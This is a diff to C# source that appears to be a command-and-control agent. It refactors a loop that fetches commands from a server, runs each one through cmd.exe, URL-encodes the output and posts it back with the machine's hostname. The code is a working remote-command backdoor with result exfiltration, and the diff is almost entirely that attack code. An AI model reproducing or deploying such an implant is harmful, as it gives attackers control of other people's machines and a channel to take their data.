@@ -136,10 +136,21 @@ namespace client
                 // execute commands
                 
                 // don't pass another shell to this command shell!!!
-                //string responseBody = "lalal";
-                foreach (string command in commandSet.commands) {
-                    Console.WriteLine($"Executing command: {command}");
-                    // execute command
+                foreach(string command in commandSet.commands){
+                    string result = await ConsoleCommand(command);
+                    string responseBody = $"{{\"hostname\": \"{hostname}\",\"response\": \"{result}\"}}";
+                    (bool l, string a) = await BuildAndSendHTTPRequest(new StringContent(responseBody));
+                }
+            } else {
+                Console.WriteLine("Agent failed to fetch commands.");
+            }
+            
+        }
+
+        private async Task<string> ConsoleCommand(string command){
+            //method to run a consolecommand and return it's result
+            Console.WriteLine($"Executing command: {command}");
+            // execute command
                     ProcessStartInfo startInfo = new ProcessStartInfo();
                     startInfo.FileName = "cmd.exe";
                     startInfo.Arguments = $"/c {command}";
@@ -153,23 +164,9 @@ namespace client
                             string result = await reader.ReadToEndAsync();
                             result = HttpUtility.UrlEncode(result);
                             Console.WriteLine(result);
-                            //Convert.ToBase64String(Encoding.UTF8.GetBytes(result));
-                            //strip special characters as to not mess with the HTTP request
-                            //result = result.Replace("\n", "").Replace("\r", "").Replace("\\", "\\\\");
-                            string responseBody = $"{{\"hostname\": \"{hostname}\",\"response\": \"{result}\"}}";
-                            
-                            (bool l, string a) = await BuildAndSendHTTPRequest(new StringContent(responseBody));
-
+                            return result;
                         }
                     }
-                }
-                
-                
-
-            } else {
-                Console.WriteLine("Agent failed to fetch commands.");
-            }
-            
         }
 
         public async Task<(bool,string)> BuildAndSendHTTPRequest(HttpContent content)
